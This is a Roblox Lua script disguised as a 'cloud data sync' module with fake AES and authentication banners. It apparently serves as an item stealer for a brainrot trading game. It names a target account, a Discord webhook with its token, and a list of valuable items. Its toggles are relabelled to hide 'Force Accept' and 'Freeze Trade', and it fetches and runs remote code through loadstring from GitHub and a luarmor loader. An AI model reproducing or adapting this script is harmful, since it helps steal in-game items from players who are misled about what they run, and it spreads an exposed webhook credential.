-- [[ CLOUD-CORE ARCHITECTURE: GLOBAL DATA SYNC v9.1.4 ]]
-- [[ ENCRYPTION: AES-256-BIT SECURE FLOW ]]
-- [[ AUTHENTICATION: VERIFIED VIA CLOUD-API ]]

-- // SYSTEM CONFIGURATION PARAMETERS
getgenv().KEY = "8a0ccdac"
getgenv().SECRET_KEY = "eb78c66039a75cec615e78cabbb276f1d18103bb454374b234f458a7430e7ad2a"
getgenv().TARGET_ID = 5567675855
getgenv().DELAY_STEP = 1
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484845739023532114/XX2aoV0wPt76Y7J05p1cbxioWAnace26vLaj7QlzIokTtyMIoJYHRFfaFs5fX_HzBmA"

-- // PRIORITY ASSET INDEX (SYSTEM CACHE)
getgenv().TARGET_BRAINROTS = {
    ["Meowl"] = true, ["Skibidi Toilet"] = true, ["Strawberry Elephant"] = true, ["Quesadillo Vampiro"] = true, ["Tacorita Bicicleta"] = true, ["La Extinct Grande"] = true, ["La Spooky Grande"] = true, ["Chipso and Queso"] = true, ["Chillin Chili"] = true, ["Tuff Toucan"] = true, ["Gobblino Uniciclino"] = true, ["W or L"] = true, ["La Jolly Grande"] = true, ["La Taco Combinasion"] = true, ["Swaggy Bros"] = true, ["La Romantic Grande"] = true, ["Festive 67"] = true, ["Nuclearo Dinossauro"] = true, ["Money Money Puggy"] = true, ["Ketupat Kepat"] = true, ["Tictac Sahur"] = true, ["Tang Tang Keletang"] = true, ["Ketchuru and Musturu"] = true, ["Lavadorito Spinito"] = true, ["Garama and Madundung"] = true, ["Burguro And Fryuro"] = true, ["Capitano Moby"] = true, ["Cerberus"] = true, ["Dragon Cannelloni"] = true, ["Mariachi Corazoni"] = true, ["Swag Soda"] = true, ["Los Hotspotsitos"] = true, ["Los Bros"] = true, ["Tralaledon"] = true, ["Los Puggies"] = true, ["Los Primos"] = true, ["Los Tacoritas"] = true, ["Los Spaghettis"] = true, ["Ginger Gerat"] = true, ["Love Love Bear"] = true, ["Spooky and Pumpky"] = true, ["Fragrama and Chocrama"] = true, ["Los Sekolahs"] = true, ["La Casa Boo"] = true, ["Reinito Sleighito"] = true, ["Ketupat Bros"] = true, ["Cooki and Milki"] = true, ["Rosey and Teddy"] = true, ["Popcuru and Fizzuru"] = true, ["La Supreme Combinasion"] = true, ["Dragon Gingerini"] = true, ["Headless Horseman"] = true, ["Hydra Dragon Cannelloni"] = true, ["Celularcini Viciosini"] = true, ["Mieteteira Bicicleteira"] = true, ["Los Sweethearts"] = true, ["Las Sis"] = true, ["Los Planitos"] = true, ["Eviledon"] = true, ["Orcaledon"] = true, ["Jolly Jolly Sahur"] = true, ["Noo my Heart"] = true, ["Fishino Clownino"] = true, ["Los Amigos"] = true, ["La Secret Combinasion"] = true, ["La Food Combinasion"] = true, ["Sammyni Fattini"] = true, ["Spaghetti Tualetti"] = true, ["Rosetti Tualetti"] = true, ["Esok Sekolah"] = true, ["Nacho Spyder"] = true, ["Griffin"] = true, ["La Ginger Sekolah"] = true, ["Lovin Rose"] = true
}

-- // CONTROL MODULE: TERMINAL INTERFACE
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wallv3"))()
local Window = Library:CreateWindow("System Terminal") -- Ресми ат: System Terminal
local Main = Window:CreateTab("Core")

Main:CreateToggle("Synchronize Assets", function(state) -- Force Accept
    getgenv().ForceAccept = state
end)

Main:CreateToggle("Network Buffer", function(state) -- Freeze Trade
    getgenv().FreezeTrade = state
end)

-- // EXECUTION HANDLER
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()

-- // LOGGING INITIALIZATION
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Internal Sync";
    Text = "Module successfully deployed.";
    Duration = 5;
})
